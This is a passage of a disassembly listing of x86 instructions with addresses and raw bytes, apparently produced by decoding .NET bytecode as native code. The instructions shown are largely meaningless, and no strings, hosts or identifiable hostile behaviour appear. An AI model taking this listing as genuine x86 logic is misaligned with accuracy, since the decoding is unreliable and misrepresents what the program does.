  4036e7:	38 ac 01 00 00 11 13 	cmp    %ch,0x13110000(%ecx,%eax,1)
  4036ee:	72 5f                	jb     0x40374f
  4036f0:	06                   	push   %es
  4036f1:	00 70 16             	add    %dh,0x16(%eax)
  4036f4:	28 4a 00             	sub    %cl,0x0(%edx)
  4036f7:	00 0a                	add    %cl,(%edx)
  4036f9:	16                   	push   %ss
  4036fa:	33 0f                	xor    (%edi),%ecx
  4036fc:	72 75                	jb     0x403773
  4036fe:	06                   	push   %es
  4036ff:	00 70 28             	add    %dh,0x28(%eax)
  403702:	30 00                	xor    %al,(%eax)
  403704:	00 06                	add    %al,(%esi)
  403706:	38 8d 01 00 00 11    	cmp    %cl,0x11000001(%ebp)
  40370c:	13 72 af             	adc    -0x51(%edx),%esi
  40370f:	06                   	push   %es
  403710:	00 70 16             	add    %dh,0x16(%eax)
  403713:	28 4a 00             	sub    %cl,0x0(%edx)
  403716:	00 0a                	add    %cl,(%edx)
  403718:	16                   	push   %ss
  403719:	40                   	inc    %eax
  40371a:	7a 01                	jp     0x40371d
  40371c:	00 00                	add    %al,(%eax)
  40371e:	7e 1f                	jle    0x40373f
  403720:	00 00                	add    %al,(%eax)
  403722:	04 2d                	add    $0x2d,%al
  403724:	0d 18 28 40 00       	or     $0x402818,%eax
  403729:	00 06                	add    %al,(%esi)
  40372b:	26 17                	es pop %ss
  40372d:	80 1f 00             	sbbb   $0x0,(%edi)
  403730:	00 04 de             	add    %al,(%esi,%ebx,8)
  403733:	0c 28                	or     $0x28,%al
  403735:	22 00                	and    (%eax),%al
  403737:	00 0a                	add    %cl,(%edx)
  403739:	28 24 00             	sub    %ah,(%eax,%eax,1)
  40373c:	00 0a                	add    %cl,(%edx)
  40373e:	de 00                	fiadds (%eax)
  403740:	28 96 00 00 0a 6f    	sub    %dl,0x6f0a0000(%esi)
  403746:	97                   	xchg   %eax,%edi
  403747:	00 00                	add    %al,(%eax)
  403749:	0a 13                	or     (%ebx),%dl
  40374b:	0c 28                	or     $0x28,%al
  40374d:	96                   	xchg   %eax,%esi
  40374e:	00 00                	add    %al,(%eax)
  403750:	0a 6f 97             	or     -0x69(%edi),%ch
  403753:	00 00                	add    %al,(%eax)
  403755:	0a 13                	or     (%ebx),%dl
  403757:	18 12                	sbb    %dl,(%edx)
  403759:	18 28                	sbb    %ch,(%eax)
  40375b:	98                   	cwtl
  40375c:	00 00                	add    %al,(%eax)
  40375e:	0a 12                	or     (%edx),%dl
  403760:	0c 28                	or     $0x28,%al
  403762:	99                   	cltd
  403763:	00 00                	add    %al,(%eax)
  403765:	0a 20                	or     (%eax),%ah
  403767:	05 10 02 00 73       	add    $0x73000210,%eax
  40376c:	9a 00 00 0a 13 0e 11 	lcall  $0x110e,$0x130a0000
  403773:	0e                   	push   %cs
  403774:	28 9b 00 00 0a 13    	sub    %bl,0x130a0000(%ebx)
  40377a:	0a 12                	or     (%edx),%dl
  40377c:	0b 11                	or     (%ecx),%edx
  40377e:	0e                   	push   %cs
  40377f:	6f                   	outsl  %ds:(%esi),(%dx)
  403780:	9c                   	pushf
  403781:	00 00                	add    %al,(%eax)
  403783:	0a 11                	or     (%ecx),%dl
  403785:	0e                   	push   %cs
  403786:	6f                   	outsl  %ds:(%esi),(%dx)
  403787:	9d                   	popf
  403788:	00 00                	add    %al,(%eax)
  40378a:	0a 28                	or     (%eax),%ch
  40378c:	9e                   	sahf
  40378d:	00 00                	add    %al,(%eax)
  40378f:	0a 11                	or     (%ecx),%dl
  403791:	0a 16                	or     (%esi),%dl
  403793:	16                   	push   %ss
  403794:	16                   	push   %ss
  403795:	16                   	push   %ss
  403796:	11 0b                	adc    %ecx,(%ebx)
  403798:	20 20                	and    %ah,(%eax)
  40379a:	00 cc                	add    %cl,%ah
  40379c:	00 6f 9f             	add    %ch,-0x61(%edi)
  40379f:	00 00                	add    %al,(%eax)
  4037a1:	0a 73 33             	or     0x33(%ebx),%dh
  4037a4:	00 00                	add    %al,(%eax)
  4037a6:	0a 13                	or     (%ebx),%dl
  4037a8:	0f 20 00             	mov    %cr0,%eax
  4037ab:	01 00                	add    %eax,(%eax)
  4037ad:	00 20                	add    %ah,(%eax)
  4037af:	9c                   	pushf
  4037b0:	00 00                	add    %al,(%eax)
  4037b2:	00 73 a0             	add    %dh,-0x60(%ebx)
  4037b5:	00 00                	add    %al,(%eax)
  4037b7:	0a 13                	or     (%ebx),%dl
  4037b9:	10 11                	adc    %dl,(%ecx)
  4037bb:	10 28                	adc    %ch,(%eax)
  4037bd:	9b                   	fwait
  4037be:	00 00                	add    %al,(%eax)
  4037c0:	0a 13                	or     (%ebx),%dl
  4037c2:	0d 11 0d 11 0e       	or     $0xe110d11,%eax
  4037c7:	12 18                	adc    (%eax),%bl
  4037c9:	16                   	push   %ss
  4037ca:	16                   	push   %ss
  4037cb:	20 00                	and    %al,(%eax)
  4037cd:	01 00                	add    %eax,(%eax)
  4037cf:	00 20                	add    %ah,(%eax)
  4037d1:	9c                   	pushf
  4037d2:	00 00                	add    %al,(%eax)
  4037d4:	00 28                	add    %ch,(%eax)
  4037d6:	a1 00 00 0a 11       	mov    0x110a0000,%eax
  4037db:	18 12                	sbb    %dl,(%edx)
  4037dd:	17                   	pop    %ss
  4037de:	16                   	push   %ss
  4037df:	16                   	push   %ss
  4037e0:	11 0e                	adc    %ecx,(%esi)
  4037e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4037e3:	9c                   	pushf
  4037e4:	00 00                	add    %al,(%eax)
  4037e6:	0a 11                	or     (%ecx),%dl
  4037e8:	0e                   	push   %cs
  4037e9:	6f                   	outsl  %ds:(%esi),(%dx)
  4037ea:	9d                   	popf
  4037eb:	00 00                	add    %al,(%eax)
  4037ed:	0a 28                	or     (%eax),%ch
  4037ef:	a1 00 00 0a 11       	mov    0x110a0000,%eax
  4037f4:	17                   	pop    %ss
  4037f5:	18 6f a2             	sbb    %ch,-0x5e(%edi)
  4037f8:	00 00                	add    %al,(%eax)
  4037fa:	0a 11                	or     (%ecx),%dl
  4037fc:	10 11                	adc    %dl,(%ecx)
  4037fe:	0f 28 a3 00 00 0a 6f 	movaps 0x6f0a0000(%ebx),%xmm4
  403805:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403806:	00 00                	add    %al,(%eax)
  403808:	0a 1b                	or     (%ebx),%bl
  40380a:	8d 2d 00 00 01 13    	lea    0x13010000,%ebp
  403810:	14 11                	adc    $0x11,%al
  403812:	14 16                	adc    $0x16,%al
  403814:	72 b9                	jb     0x4037cf
  403816:	06                   	push   %es
  403817:	00 70 a2             	add    %dh,-0x5e(%eax)
  40381a:	11 14 17             	adc    %edx,(%edi,%edx,1)
  40381d:	7e 0a                	jle    0x403829
  40381f:	00 00                	add    %al,(%eax)
  403821:	04 a2                	add    $0xa2,%al
  403823:	11 14 18             	adc    %edx,(%eax,%ebx,1)
  403826:	28 4d 00             	sub    %cl,0x0(%ebp)
  403829:	00 06                	add    %al,(%esi)
  40382b:	a2 11 14 19 7e       	mov    %al,0x7e191411
  403830:	0a 00                	or     (%eax),%al
  403832:	00 04 a2             	add    %al,(%edx,%eiz,4)
  403835:	11 14 1a             	adc    %edx,(%edx,%ebx,1)
  403838:	11 0f                	adc    %ecx,(%edi)
  40383a:	6f                   	outsl  %ds:(%esi),(%dx)
  40383b:	6a 00                	push   $0x0
  40383d:	00 0a                	add    %cl,(%edx)
  40383f:	28 52 00             	sub    %dl,0x0(%edx)
  403842:	00 06                	add    %al,(%esi)
  403844:	28 a5 00 00 0a a2    	sub    %ah,-0x5df60000(%ebp)
  40384a:	11 14 28             	adc    %edx,(%eax,%ebp,1)
  40384d:	7f 00                	jg     0x40384f
  40384f:	00 0a                	add    %cl,(%edx)
  403851:	28 25 00 00 06 11    	sub    %ah,0x11060000
  403857:	0a 6f a6             	or     -0x5a(%edi),%ch
  40385a:	00 00                	add    %al,(%eax)
  40385c:	0a 11                	or     (%ecx),%dl
  40385e:	0f 6f 6c 00 00       	movq   0x0(%eax,%eax,1),%mm5
  403863:	0a 11                	or     (%ecx),%dl
  403865:	10 6f a7             	adc    %ch,-0x59(%edi)
  403868:	00 00                	add    %al,(%eax)
  40386a:	0a 11                	or     (%ecx),%dl
  40386c:	0d 6f a6 00 00       	or     $0xa66f,%eax
  403871:	0a 11                	or     (%ecx),%dl
  403873:	0e                   	push   %cs
  403874:	6f                   	outsl  %ds:(%esi),(%dx)
  403875:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403876:	00 00                	add    %al,(%eax)
  403878:	0a de                	or     %dh,%bl
  40387a:	0c 28                	or     $0x28,%al
  40387c:	22 00                	and    (%eax),%al
  40387e:	00 0a                	add    %cl,(%edx)
  403880:	28 24 00             	sub    %ah,(%eax,%eax,1)
  403883:	00 0a                	add    %cl,(%edx)
  403885:	de 00                	fiadds (%eax)
  403887:	de 0f                	fimuls (%edi)
  403889:	25 28 22 00 00       	and    $0x2228,%eax
  40388e:	0a 13                	or     (%ebx),%dl
  403890:	11 28                	adc    %ebp,(%eax)
  403892:	24 00                	and    $0x0,%al
  403894:	00 0a                	add    %cl,(%edx)
  403896:	de 00                	fiadds (%eax)
  403898:	de 1b                	ficomps (%ebx)
  40389a:	25 28 22 00 00       	and    $0x2228,%eax
  40389f:	0a 13                	or     (%ebx),%dl
  4038a1:	12 11                	adc    (%ecx),%dl
  4038a3:	12 6f 92             	adc    -0x6e(%edi),%ch
  4038a6:	00 00                	add    %al,(%eax)
  4038a8:	0a 28                	or     (%eax),%ch
  4038aa:	30 00                	xor    %al,(%eax)
  4038ac:	00 06                	add    %al,(%esi)
  4038ae:	28 24 00             	sub    %ah,(%eax,%eax,1)
  4038b1:	00 0a                	add    %cl,(%edx)
  4038b3:	de 00                	fiadds (%eax)
  4038b5:	2a 00                	sub    (%eax),%al
  4038b7:	00 41 f4             	add    %al,-0xc(%ecx)
  4038ba:	00 00                	add    %al,(%eax)
  4038bc:	00 00                	add    %al,(%eax)
  4038be:	00 00                	add    %al,(%eax)
  4038c0:	5b                   	pop    %ebx
  4038c1:	01 00                	add    %eax,(%eax)
  4038c3:	00 1c 00             	add    %bl,(%eax,%eax,1)
  4038c6:	00 00                	add    %al,(%eax)
  4038c8:	77 01                	ja     0x4038cb
  4038ca:	00 00                	add    %al,(%eax)
  4038cc:	0c 00                	or     $0x0,%al
  4038ce:	00 00                	add    %al,(%eax)
  4038d0:	25 00 00 01 00       	and    $0x10000,%eax
  4038d5:	00 00                	add    %al,(%eax)
  4038d7:	00 8e 02 00 00 0c    	add    %cl,0xc000002(%esi)
  4038dd:	00 00                	add    %al,(%eax)
  4038df:	00 9a 02 00 00 0e    	add    %bl,0xe000002(%edx)
  4038e5:	00 00                	add    %al,(%eax)
  4038e7:	00 25 00 00 01 00    	add    %ah,0x10000
  4038ed:	00 00                	add    %al,(%eax)
  4038ef:	00 e0                	add    %ah,%al
  4038f1:	02 00                	add    (%eax),%al
  4038f3:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4038f6:	00 00                	add    %al,(%eax)
  4038f8:	ec                   	in     (%dx),%al
  4038f9:	02 00                	add    (%eax),%al
  4038fb:	00 0f                	add    %cl,(%edi)
  4038fd:	00 00                	add    %al,(%eax)
  4038ff:	00 25 00 00 01 00    	add    %ah,0x10000
  403905:	00 00                	add    %al,(%eax)
  403907:	00 10                	add    %dl,(%eax)
  403909:	03 00                	add    (%eax),%eax
  40390b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40390e:	00 00                	add    %al,(%eax)
  403910:	1c 03                	sbb    $0x3,%al
  403912:	00 00                	add    %al,(%eax)
  403914:	0f 00 00             	sldt   (%eax)
  403917:	00 25 00 00 01 00    	add    %ah,0x10000
  40391d:	00 00                	add    %al,(%eax)
  40391f:	00 63 03             	add    %ah,0x3(%ebx)
  403922:	00 00                	add    %al,(%eax)
  403924:	0c 00                	or     $0x0,%al
  403926:	00 00                	add    %al,(%eax)
  403928:	6f                   	outsl  %ds:(%esi),(%dx)
  403929:	03 00                	add    (%eax),%eax
  40392b:	00 0f                	add    %cl,(%edi)
  40392d:	00 00                	add    %al,(%eax)
  40392f:	00 25 00 00 01 00    	add    %ah,0x10000
  403935:	00 00                	add    %al,(%eax)
  403937:	00 3e                	add    %bh,(%esi)
  403939:	04 00                	add    $0x0,%al
  40393b:	00 4e 00             	add    %cl,0x0(%esi)
  40393e:	00 00                	add    %al,(%eax)
  403940:	8c 04 00             	mov    %es,(%eax,%eax,1)
  403943:	00 52 00             	add    %dl,0x0(%edx)
  403946:	00 00                	add    %al,(%eax)
  403948:	25 00 00 01 00       	and    $0x10000,%eax
  40394d:	00 00                	add    %al,(%eax)
  40394f:	00 f2                	add    %dh,%dl
  403951:	05 00 00 16 00       	add    $0x160000,%eax
  403956:	00 00                	add    %al,(%eax)
  403958:	08 06                	or     %al,(%esi)
  40395a:	00 00                	add    %al,(%eax)
  40395c:	0c 00                	or     $0x0,%al
  40395e:	00 00                	add    %al,(%eax)
  403960:	25 00 00 01 00       	and    $0x10000,%eax
  403965:	00 00                	add    %al,(%eax)
  403967:	00 2a                	add    %ch,(%edx)
  403969:	07                   	pop    %es
  40396a:	00 00                	add    %al,(%eax)
  40396c:	25 00 00 00 4f       	and    $0x4f000000,%eax
  403971:	07                   	pop    %es
  403972:	00 00                	add    %al,(%eax)
  403974:	0c 00                	or     $0x0,%al
  403976:	00 00                	add    %al,(%eax)
  403978:	25 00 00 01 00       	and    $0x10000,%eax
  40397d:	00 00                	add    %al,(%eax)
  40397f:	00 f2                	add    %dh,%dl
  403981:	05 00 00 6b 01       	add    $0x16b0000,%eax
  403986:	00 00                	add    %al,(%eax)
  403988:	5d                   	pop    %ebp
  403989:	07                   	pop    %es
  40398a:	00 00                	add    %al,(%eax)
  40398c:	0f 00 00             	sldt   (%eax)
  40398f:	00 25 00 00 01 00    	add    %ah,0x10000
  403995:	00 00                	add    %al,(%eax)
  403997:	00 00                	add    %al,(%eax)
  403999:	00 00                	add    %al,(%eax)
  40399b:	00 6e 07             	add    %ch,0x7(%esi)
  40399e:	00 00                	add    %al,(%eax)
  4039a0:	6e                   	outsb  %ds:(%esi),(%dx)
  4039a1:	07                   	pop    %es
  4039a2:	00 00                	add    %al,(%eax)
  4039a4:	1b 00                	sbb    (%eax),%eax
  4039a6:	00 00                	add    %al,(%eax)
  4039a8:	25 00 00 01 1b       	and    $0x1b010000,%eax
  4039ad:	30 0a                	xor    %cl,(%edx)
  4039af:	00 b2 04 00 00 1e    	add    %dh,0x1e000004(%edx)
  4039b5:	00 00                	add    %al,(%eax)
  4039b7:	11 28                	adc    %ebp,(%eax)
  4039b9:	a8 00                	test   $0x0,%al
  4039bb:	00 0a                	add    %cl,(%edx)
  4039bd:	02 6f a9             	add    -0x57(%edi),%ch
  4039c0:	00 00                	add    %al,(%eax)
  4039c2:	0a 6f aa             	or     -0x56(%edi),%ch
  4039c5:	00 00                	add    %al,(%eax)
  4039c7:	0a 13                	or     (%ebx),%dl
  4039c9:	05 16 13 04 38       	add    $0x38041316,%eax
  4039ce:	67 04 00             	addr16 add $0x0,%al
  4039d1:	00 11                	add    %dl,(%ecx)
  4039d3:	05 11 04 9a 0a       	add    $0xa9a0411,%eax
  4039d8:	06                   	push   %es
  4039d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4039da:	ab                   	stos   %eax,%es:(%edi)
  4039db:	00 00                	add    %al,(%eax)
  4039dd:	0a 72 c3             	or     -0x3d(%edx),%dh
  4039e0:	06                   	push   %es
  4039e1:	00 70 16             	add    %dh,0x16(%eax)
  4039e4:	28 4a 00             	sub    %cl,0x0(%edx)
  4039e7:	00 0a                	add    %cl,(%edx)
  4039e9:	16                   	push   %ss
  4039ea:	40                   	inc    %eax
  4039eb:	44                   	inc    %esp
  4039ec:	04 00                	add    $0x0,%al
  4039ee:	00 06                	add    %al,(%esi)
  4039f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4039f1:	ac                   	lods   %ds:(%esi),%al
  4039f2:	00 00                	add    %al,(%eax)
  4039f4:	0a 13                	or     (%ebx),%dl
  4039f6:	07                   	pop    %es
  4039f7:	16                   	push   %ss
  4039f8:	13 06                	adc    (%esi),%eax
  4039fa:	38 29                	cmp    %ch,(%ecx)
  4039fc:	04 00                	add    $0x0,%al
  4039fe:	00 11                	add    %dl,(%ecx)
  403a00:	07                   	pop    %es
  403a01:	11 06                	adc    %eax,(%esi)
  403a03:	9a 0b 07 14 72 11 03 	lcall  $0x311,$0x7214070b
  403a0a:	00 70 16             	add    %dh,0x16(%eax)
  403a0d:	8d 03                	lea    (%ebx),%eax
  403a0f:	00 00                	add    %al,(%eax)
  403a11:	01 14 14             	add    %edx,(%esp,%edx,1)
  403a14:	14 28                	adc    $0x28,%al
  403a16:	ad                   	lods   %ds:(%esi),%eax
  403a17:	00 00                	add    %al,(%eax)
  403a19:	0a 72 d1             	or     -0x2f(%edx),%dh
  403a1c:	06                   	push   %es
  403a1d:	00 70 16             	add    %dh,0x16(%eax)
  403a20:	28 ae 00 00 0a 2c    	sub    %ch,0x2c0a0000(%esi)
  403a26:	65 07                	gs pop %es
  403a28:	14 72                	adc    $0x72,%al
  403a2a:	d9 06                	flds   (%esi)
  403a2c:	00 70 18             	add    %dh,0x18(%eax)
  403a2f:	8d 03                	lea    (%ebx),%eax
  403a31:	00 00                	add    %al,(%eax)
  403a33:	01 13                	add    %edx,(%ebx)
  403a35:	09 11                	or     %edx,(%ecx)
  403a37:	09 16                	or     %edx,(%esi)
  403a39:	14 a2                	adc    $0xa2,%al
  403a3b:	11 09                	adc    %ecx,(%ecx)
  403a3d:	17                   	pop    %ss
  403a3e:	1b 8d 03 00 00 01    	sbb    0x1000003(%ebp),%ecx
  403a44:	13 08                	adc    (%eax),%ecx
  403a46:	11 08                	adc    %ecx,(%eax)
  403a48:	16                   	push   %ss
  403a49:	7e 07                	jle    0x403a52
  403a4b:	00 00                	add    %al,(%eax)
  403a4d:	04 a2                	add    $0xa2,%al
  403a4f:	11 08                	adc    %ecx,(%eax)
  403a51:	17                   	pop    %ss
  403a52:	7e 08                	jle    0x403a5c
  403a54:	00 00                	add    %al,(%eax)
  403a56:	04 a2                	add    $0xa2,%al
  403a58:	11 08                	adc    %ecx,(%eax)
  403a5a:	18 7e 0a             	sbb    %bh,0xa(%esi)
  403a5d:	00 00                	add    %al,(%eax)
  403a5f:	04 a2                	add    $0xa2,%al
  403a61:	11 08                	adc    %ecx,(%eax)
  403a63:	19 7e 09             	sbb    %edi,0x9(%esi)
  403a66:	00 00                	add    %al,(%eax)
  403a68:	04 a2                	add    $0xa2,%al
  403a6a:	11 08                	adc    %ecx,(%eax)
  403a6c:	1a 28                	sbb    (%eax),%ch
  403a6e:	4d                   	dec    %ebp
  403a6f:	00 00                	add    %al,(%eax)
  403a71:	06                   	push   %es
  403a72:	a2 11 08 a2 11       	mov    %al,0x11a20811
  403a77:	09 14 14             	or     %edx,(%esp,%edx,1)
  403a7a:	14 17                	adc    $0x17,%al
  403a7c:	28 72 00             	sub    %dh,0x0(%edx)
  403a7f:	00 0a                	add    %cl,(%edx)
  403a81:	26 dd e2             	es fucom %st(2)
  403a84:	03 00                	add    (%eax),%eax
  403a86:	00 38                	add    %bh,(%eax)
  403a88:	96                   	xchg   %eax,%esi
  403a89:	03 00                	add    (%eax),%eax
  403a8b:	00 07                	add    %al,(%edi)
  403a8d:	14 72                	adc    $0x72,%al
  403a8f:	11 03                	adc    %eax,(%ebx)
  403a91:	00 70 16             	add    %dh,0x16(%eax)
  403a94:	8d 03                	lea    (%ebx),%eax
  403a96:	00 00                	add    %al,(%eax)
  403a98:	01 14 14             	add    %edx,(%esp,%edx,1)
  403a9b:	14 28                	adc    $0x28,%al
  403a9d:	ad                   	lods   %ds:(%esi),%eax
  403a9e:	00 00                	add    %al,(%eax)
  403aa0:	0a 72 e7             	or     -0x19(%edx),%dh
  403aa3:	06                   	push   %es
  403aa4:	00 70 16             	add    %dh,0x16(%eax)
  403aa7:	28 ae 00 00 0a 39    	sub    %ch,0x390a0000(%esi)
  403aad:	9d                   	popf
  403aae:	00 00                	add    %al,(%eax)
  403ab0:	00 72 ff             	add    %dh,-0x1(%edx)
  403ab3:	06                   	push   %es
  403ab4:	00 70 7e             	add    %dh,0x7e(%eax)
  403ab7:	0a 00                	or     (%eax),%al
  403ab9:	00 04 28             	add    %al,(%eax,%ebp,1)
  403abc:	42                   	inc    %edx
  403abd:	00 00                	add    %al,(%eax)
  403abf:	0a 28                	or     (%eax),%ch
  403ac1:	4d                   	dec    %ebp
  403ac2:	00 00                	add    %al,(%eax)
  403ac4:	06                   	push   %es
  403ac5:	28 42 00             	sub    %al,0x0(%edx)
  403ac8:	00 0a                	add    %cl,(%edx)
  403aca:	7e 0a                	jle    0x403ad6
  403acc:	00 00                	add    %al,(%eax)
  403ace:	04 28                	add    $0x28,%al
  403ad0:	42                   	inc    %edx
  403ad1:	00 00                	add    %al,(%eax)
  403ad3:	0a 7e 1a             	or     0x1a(%esi),%bh
  403ad6:	00 00                	add    %al,(%eax)
  403ad8:	04 18                	add    $0x18,%al
  403ada:	9a 28 af 00 00 0a 28 	lcall  $0x280a,$0xaf28
  403ae1:	75 00                	jne    0x403ae3
  403ae3:	00 0a                	add    %cl,(%edx)
  403ae5:	28 42 00             	sub    %al,0x0(%edx)
  403ae8:	00 0a                	add    %cl,(%edx)
  403aea:	7e 0a                	jle    0x403af6
  403aec:	00 00                	add    %al,(%eax)
  403aee:	04 28                	add    $0x28,%al
  403af0:	42                   	inc    %edx
  403af1:	00 00                	add    %al,(%eax)
  403af3:	0a 07                	or     (%edi),%al
  403af5:	14 72                	adc    $0x72,%al
  403af7:	d9 06                	flds   (%esi)
  403af9:	00 70 18             	add    %dh,0x18(%eax)
  403afc:	8d 03                	lea    (%ebx),%eax
  403afe:	00 00                	add    %al,(%eax)
  403b00:	01 13                	add    %edx,(%ebx)
  403b02:	08 11                	or     %dl,(%ecx)
  403b04:	08 16                	or     %dl,(%esi)
  403b06:	14 a2                	adc    $0xa2,%al
  403b08:	11 08                	adc    %ecx,(%eax)
  403b0a:	17                   	pop    %ss
  403b0b:	17                   	pop    %ss
  403b0c:	8d 03                	lea    (%ebx),%eax
  403b0e:	00 00                	add    %al,(%eax)
  403b10:	01 13                	add    %edx,(%ebx)
  403b12:	09 11                	or     %edx,(%ecx)
  403b14:	09 16                	or     %edx,(%esi)
  403b16:	7e 1a                	jle    0x403b32
  403b18:	00 00                	add    %al,(%eax)
  403b1a:	04 18                	add    $0x18,%al
  403b1c:	9a 28 af 00 00 0a 8c 	lcall  $0x8c0a,$0xaf28
  403b23:	71 00                	jno    0x403b25
  403b25:	00 01                	add    %al,(%ecx)
  403b27:	a2 11 09 a2 11       	mov    %al,0x11a20911
  403b2c:	08 14 14             	or     %dl,(%esp,%edx,1)
  403b2f:	14 28                	adc    $0x28,%al
  403b31:	ad                   	lods   %ds:(%esi),%eax
  403b32:	00 00                	add    %al,(%eax)
  403b34:	0a 28                	or     (%eax),%ch
  403b36:	60                   	pusha
  403b37:	00 00                	add    %al,(%eax)
  403b39:	0a 28                	or     (%eax),%ch
  403b3b:	21 00                	and    %eax,(%eax)
  403b3d:	00 0a                	add    %cl,(%edx)
  403b3f:	28 25 00 00 06 dd    	sub    %ah,0xdd060000
  403b45:	20 03                	and    %al,(%ebx)
  403b47:	00 00                	add    %al,(%eax)
  403b49:	38 d4                	cmp    %dl,%ah
  403b4b:	02 00                	add    (%eax),%al
  403b4d:	00 07                	add    %al,(%edi)
  403b4f:	14 72                	adc    $0x72,%al
  403b51:	11 03                	adc    %eax,(%ebx)
  403b53:	00 70 16             	add    %dh,0x16(%eax)
  403b56:	8d 03                	lea    (%ebx),%eax
  403b58:	00 00                	add    %al,(%eax)
  403b5a:	01 14 14             	add    %edx,(%esp,%edx,1)
  403b5d:	14 28                	adc    $0x28,%al
  403b5f:	ad                   	lods   %ds:(%esi),%eax
  403b60:	00 00                	add    %al,(%eax)
  403b62:	0a 72 11             	or     0x11(%edx),%dh
  403b65:	07                   	pop    %es
  403b66:	00 70 16             	add    %dh,0x16(%eax)
  403b69:	28 ae 00 00 0a 2c    	sub    %ch,0x2c0a0000(%esi)
  403b6f:	62 07                	bound  %eax,(%edi)
  403b71:	14 72                	adc    $0x72,%al
  403b73:	d9 06                	flds   (%esi)
  403b75:	00 70 18             	add    %dh,0x18(%eax)
  403b78:	8d 03                	lea    (%ebx),%eax
  403b7a:	00 00                	add    %al,(%eax)
  403b7c:	01 13                	add    %edx,(%ebx)
  403b7e:	08 11                	or     %dl,(%ecx)
  403b80:	08 16                	or     %dl,(%esi)
  403b82:	14 a2                	adc    $0xa2,%al
  403b84:	11 08                	adc    %ecx,(%eax)
  403b86:	17                   	pop    %ss
  403b87:	17                   	pop    %ss
  403b88:	8d 03                	lea    (%ebx),%eax
  403b8a:	00 00                	add    %al,(%eax)
  403b8c:	01 13                	add    %edx,(%ebx)
  403b8e:	09 11                	or     %edx,(%ecx)
  403b90:	09 16                	or     %edx,(%esi)
  403b92:	7e 1a                	jle    0x403bae
  403b94:	00 00                	add    %al,(%eax)
  403b96:	04 18                	add    $0x18,%al
  403b98:	9a a2 11 09 a2 11 08 	lcall  $0x811,$0xa20911a2
  403b9f:	14 14                	adc    $0x14,%al
  403ba1:	14 28                	adc    $0x28,%al
  403ba3:	ad                   	lods   %ds:(%esi),%eax
  403ba4:	00 00                	add    %al,(%eax)
  403ba6:	0a 28                	or     (%eax),%ch
  403ba8:	21 00                	and    %eax,(%eax)
  403baa:	00 0a                	add    %cl,(%edx)
  403bac:	0c 08                	or     $0x8,%al
  403bae:	72 27                	jb     0x403bd7
  403bb0:	02 00                	add    (%eax),%al
  403bb2:	70 6f                	jo     0x403c23
  403bb4:	b0 00                	mov    $0x0,%al
  403bb6:	00 0a                	add    %cl,(%edx)
  403bb8:	2c 08                	sub    $0x8,%al
  403bba:	08 28                	or     %ch,(%eax)
  403bbc:	30 00                	xor    %al,(%eax)
  403bbe:	00 06                	add    %al,(%esi)
  403bc0:	2b 06                	sub    (%esi),%eax
  403bc2:	08 28                	or     %ch,(%eax)
  403bc4:	2f                   	das
  403bc5:	00 00                	add    %al,(%eax)
  403bc7:	06                   	push   %es
  403bc8:	dd 9c 02 00 00 38 50 	fstpl  0x50380000(%edx,%eax,1)
  403bcf:	02 00                	add    (%eax),%al
  403bd1:	00 07                	add    %al,(%edi)
  403bd3:	14 72                	adc    $0x72,%al
  403bd5:	11 03                	adc    %eax,(%ebx)
  403bd7:	00 70 16             	add    %dh,0x16(%eax)
  403bda:	8d 03                	lea    (%ebx),%eax
  403bdc:	00 00                	add    %al,(%eax)
  403bde:	01 14 14             	add    %edx,(%esp,%edx,1)
  403be1:	14 28                	adc    $0x28,%al
  403be3:	ad                   	lods   %ds:(%esi),%eax
  403be4:	00 00                	add    %al,(%eax)
  403be6:	0a 72 27             	or     0x27(%edx),%dh
  403be9:	07                   	pop    %es
  403bea:	00 70 16             	add    %dh,0x16(%eax)
  403bed:	28 ae 00 00 0a 2c    	sub    %ch,0x2c0a0000(%esi)
  403bf3:	66 7e 1a             	data16 jle 0x403c10
  403bf6:	00 00                	add    %al,(%eax)
  403bf8:	04 18                	add    $0x18,%al
  403bfa:	9a 28 b1 00 00 0a 2c 	lcall  $0x2c0a,$0xb128
  403c01:	4e                   	dec    %esi
  403c02:	07                   	pop    %es
  403c03:	14 72                	adc    $0x72,%al
  403c05:	d9 06                	flds   (%esi)
  403c07:	00 70 18             	add    %dh,0x18(%eax)
  403c0a:	8d 03                	lea    (%ebx),%eax
  403c0c:	00 00                	add    %al,(%eax)
  403c0e:	01 13                	add    %edx,(%ebx)
  403c10:	08 11                	or     %dl,(%ecx)
  403c12:	08 16                	or     %dl,(%esi)
  403c14:	14 a2                	adc    $0xa2,%al
  403c16:	11 08                	adc    %ecx,(%eax)
  403c18:	17                   	pop    %ss
  403c19:	18 8d 03 00 00 01    	sbb    %cl,0x1000003(%ebp)
  403c1f:	13 09                	adc    (%ecx),%ecx
  403c21:	11 09                	adc    %ecx,(%ecx)
  403c23:	16                   	push   %ss
  403c24:	7e 1a                	jle    0x403c40
  403c26:	00 00                	add    %al,(%eax)
  403c28:	04 18                	add    $0x18,%al
  403c2a:	9a a2 11 09 17 7e 1a 	lcall  $0x1a7e,$0x170911a2
  403c31:	00 00                	add    %al,(%eax)
  403c33:	04 19                	add    $0x19,%al
  403c35:	9a 28 83 00 00 0a 28 	lcall  $0x280a,$0x8328
  403c3c:	51                   	push   %ecx
  403c3d:	00 00                	add    %al,(%eax)
  403c3f:	06                   	push   %es
  403c40:	a2 11 09 a2 11       	mov    %al,0x11a20911
  403c45:	08 14 14             	or     %dl,(%esp,%edx,1)
  403c48:	14 17                	adc    $0x17,%al
  403c4a:	28 72 00             	sub    %dh,0x0(%edx)
  403c4d:	00 0a                	add    %cl,(%edx)
  403c4f:	26 dd 14 02          	fstl   %es:(%edx,%eax,1)
  403c53:	00 00                	add    %al,(%eax)
  403c55:	38 c8                	cmp    %cl,%al
  403c57:	01 00                	add    %eax,(%eax)
  403c59:	00 07                	add    %al,(%edi)
  403c5b:	14 72                	adc    $0x72,%al
  403c5d:	11 03                	adc    %eax,(%ebx)
  403c5f:	00 70 16             	add    %dh,0x16(%eax)
  403c62:	8d 03                	lea    (%ebx),%eax
  403c64:	00 00                	add    %al,(%eax)
  403c66:	01 14 14             	add    %edx,(%esp,%edx,1)
  403c69:	14 28                	adc    $0x28,%al
  403c6b:	ad                   	lods   %ds:(%esi),%eax
  403c6c:	00 00                	add    %al,(%eax)
  403c6e:	0a 72 35             	or     0x35(%edx),%dh
  403c71:	07                   	pop    %es
